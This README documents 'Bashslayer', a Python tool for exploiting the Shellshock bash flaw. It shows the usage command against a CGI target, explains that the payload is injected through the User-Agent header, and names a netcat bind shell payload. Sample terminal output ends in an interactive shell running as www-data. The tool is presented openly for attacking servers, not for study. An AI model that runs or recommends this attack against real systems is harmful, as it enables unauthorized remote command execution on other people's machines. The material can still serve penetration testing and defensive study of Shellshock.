Bashslayer
==========

A tool written in Python for exploiting the Shellshock vulnerability in bash.

Usage
==========

>>To attempt exploitation of a target-

./bslayer.py [target host] [payload]
E.X ./bslayer.py http://localhost/cgi-bin/vuln nc_bind

>>To view available payloads-

./bslayer.py payloads

This tool will inject a payload included in an environment variable into a User-Agent header via POST.
The tool will then try to establish a socket to the payload, or vice versa, depending on the type of payload.

As of now, the payloads supported are-

[ 1 ]- Netcat Bind Shell (nc_bind)

---------------------------------------------------------------------------------------------------------------------

root@kali:~/bashslayer# ./bslayer.py http://localhost/cgi-bin/vuln nc_bind

_____________________________________________________________
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
      / |
     || |
     || |
     || |  BashSlayer v1.0
     || |  Written by Kory Findley (K0FIN)
     || |
     || |
     || |
     || |
     || |
   <======>
      ||
      ||
      ||  
     {:;}


Available Commands >> 
                      > ./bslayer.py [url] [payload]
                      > ./bslayer payloads

E.X   >> ./bslayer.py http://localhost/cgi-bin/file.sh bind
_____________________________________________________________
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    
[*]Bind shell payload sent.
[>]Socket Established. Press [ENTER] To Start Command Shell- 
------------------------------------------------------------
ID: uid=33(www-data) gid=33(www-data) groups=33(www-data)
------------------------------------------------------------

$slayershell~>
